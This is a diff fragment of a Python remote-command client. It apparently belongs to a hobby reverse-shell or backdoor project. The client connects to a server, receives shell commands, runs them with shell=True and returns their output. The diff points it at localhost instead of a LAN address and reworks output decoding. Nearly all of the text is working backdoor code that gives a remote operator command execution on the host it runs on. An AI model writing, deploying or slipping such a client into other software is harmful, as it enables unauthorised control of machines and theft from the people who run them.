@@ -5,13 +5,12 @@ import time
 import signal
 import sys
 import struct
-import unicodedata
 
 class Client(object):
 
     def __init__(self):
         # self.serverHost = '192.168.1.9'
-        self.serverHost = '192.168.0.10'
+        self.serverHost = 'localhost'
         self.serverPort = 9999
         self.socket = None
 
@@ -66,6 +65,7 @@ class Client(object):
     def receive_commands(self):
         """ Receive commands from remote server and run on local machine """
         try:
+            print(self.socket.recv(10))
             self.socket.recv(10)
         except Exception as e:
             print('Could not start communication with server: %s\n' %str(e))
@@ -82,7 +82,7 @@ class Client(object):
                     os.chdir(directory.strip())
                 except Exception as e:
                     output_str = "Could not change directory: %s\n" %str(e)
-                else:
+                else: 
                     output_str = ""
             elif data[:].decode("utf-8") == 'quit':
                 self.socket.close()
@@ -91,20 +91,15 @@ class Client(object):
                 try:
                     cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,
                                            stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-                    output_str = cmd.stdout.read() + cmd.stderr.read()
-                    # output_str = output_bytes.encode("utf-8", errors="ignore")
+                    output_bytes = cmd.stdout.read() + cmd.stderr.read()
+                    output_str = output_bytes.decode("utf-8", errors="replace")
                 except Exception as e:
                     # TODO: Error description is lost
                     output_str = "Command execution unsuccessful: %s\n" %str(e)
             if output_str is not None:
-                res = []
-                for i in output_str:
-                    if ord(i) > 128:
-                        i = ''
-                    res.append(i)
-                output_str = ''.join(res)
-                try: 
-                    self.print_output(str(output_str).encode('ascii', errors='replace'))
+                print(output_str)
+                try:
+                    self.print_output(output_str)
                 except Exception as e:
                     print('Cannot send command output: %s' %str(e))
         self.socket.close()
@@ -120,9 +115,9 @@ def main():
             client.socket_connect()
         except Exception as e:
             print("Error on socket connections: %s" %str(e))
-            time.sleep(5)
+            time.sleep(5)     
         else:
-            break
+            break    
     try:
         client.receive_commands()
     except Exception as e:
